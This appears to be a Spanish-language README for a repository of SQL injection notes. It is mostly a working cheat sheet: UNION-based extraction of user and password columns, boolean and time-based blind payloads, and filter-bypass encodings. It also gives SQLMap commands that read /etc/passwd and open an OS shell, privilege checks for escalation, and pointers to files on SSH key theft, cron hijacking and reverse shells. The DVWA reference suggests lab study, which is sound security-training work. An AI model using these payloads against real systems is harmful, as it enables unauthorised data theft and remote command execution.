# SQL Injection

Referencia completa de inyección SQL manual y automatizada con SQLMap.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `SQL-Pasos.txt` | Guía paso a paso — detección, UNION, Blind, bypass, escalada |
| `SQLi-MiniGuide.txt` | Cheatsheet rápido — Blind, Time-based, OOB, leer/escribir ficheros, RCE |
| `SQL-Map-InjectionTypes.txt` | SQLMap — técnicas, flags, tampers, cookies, POST, proxy |
| `SQLi-LOADFILE-OUTFILE.txt` | LOAD_FILE e INTO OUTFILE — cron hijacking, robo de clave SSH |
| `Escalada-WebShell-RCE.txt` | Escalada completa — webshell → UDF → reverse shell |
| `appendNumberTamper.py` | Tamper personalizado para SQLMap |

---

## Detección rápida

```
'                          → error visible → UNION / Error-based
1' AND 1=1-- -  vs  1' AND 1=2-- -  → respuestas distintas → Boolean Blind
1' AND sleep(5)-- -        → retraso → Time-based Blind
1' UNION SELECT NULL-- -   → funciona → UNION-based
```

---

## UNION-based — flujo

```sql
-- 1. Contar columnas
1' ORDER BY 1-- -   (subir hasta error)

-- 2. Confirmar con UNION (siempre NULL, no enteros)
1' UNION SELECT NULL,NULL-- -

-- 3. Info básica
1' UNION SELECT user(),database()-- -

-- 4. Listar bases de datos
1' UNION SELECT schema_name,null FROM information_schema.schemata-- -

-- 5. Tablas de una BD
1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='nombre_bd'-- -

-- 6. Columnas de una tabla
1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -

-- 7. Extraer datos
1' UNION SELECT user,password FROM dvwa.users-- -
```

> ⚠️ Usar siempre `NULL` en UNION SELECT — compatible con cualquier tipo de columna.

---

## Bypass — espacios filtrados

| Sustituto | Valor |
|---|---|
| `%09` | Tab (el más fiable) |
| `%0a` | Newline |
| `/**/` | Comentario vacío |
| `+` | Espacio (a veces) |

## Bypass — sin comentarios (`-- -`)

La comilla final de la consulta original cierra el payload:

```
?name=x'%09UNION%09SELECT%091,2,3,4,'5
```

---

## Boolean Blind — flujo

```sql
-- Confirmar
1' AND 1=1-- -   (normal)
1' AND 1=2-- -   (diferente)

-- Longitud
1' AND length(database())=4-- -

-- Carácter a carácter
1' AND substring(database(),1,1)='d'-- -

-- Si comillas filtradas → ASCII
1' AND ascii(substring(database(),1,1))=100-- -
```

---

## Time-based Blind

```sql
1' AND sleep(5)-- -
1' AND IF(substring(database(),1,1)='d', sleep(5), 0)-- -
-- SLEEP filtrado:
1' AND BENCHMARK(10000000,MD5('A'))-- -
```

---

## SQLMap — comandos clave

```bash
# Básico
sqlmap -u "URL?id=1" --dbs
sqlmap -u "URL?id=1" --technique=B --dbs          # Boolean blind
sqlmap -u "URL?id=1" --technique=T --time-sec=5   # Time-based
sqlmap -u "URL?id=1" -D bd -T tabla --dump

# Con cookie / POST
sqlmap -u "URL?id=1" --cookie="PHPSESSID=abc123" --dbs
sqlmap -u "URL" --data="user=a&pass=b" -p user --dbs

# Tampers
sqlmap -u "URL?id=1" --tamper=space2comment
sqlmap -u "URL?id=1" --tamper=space2comment,randomcase,between

# Utilidad
sqlmap -u "URL?id=1" --level=3 --risk=2 --threads=10
sqlmap -u "URL?id=1" --file-read="/etc/passwd"
sqlmap -u "URL?id=1" --os-shell
sqlmap -u "URL?id=1" --proxy=http://127.0.0.1:8080 -v 3
```

---

## Tampers útiles

| Tamper | Qué hace |
|---|---|
| `space2comment` | espacios → `/**/` |
| `space2hash` | espacios → `%23%0a` |
| `space2plus` | espacios → `+` |
| `randomcase` | mayúsculas aleatorias |
| `between` | `>` → `BETWEEN` |
| `equaltolike` | `=` → `LIKE` |

---

## Verificar privilegios para escalada

```sql
-- Privilegio FILE
1' UNION SELECT file_priv,null FROM mysql.user WHERE user='root'-- -
-- Y = tiene privilegios

-- Restricción de escritura
1' UNION SELECT @@secure_file_priv,null-- -
-- vacío = sin restricción

-- Directorio de plugins
1' UNION SELECT @@plugin_dir,null-- -

-- Arquitectura
1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -
```

> Para escalada completa (webshell → UDF → reverse shell) ver `Escalada-WebShell-RCE.txt`
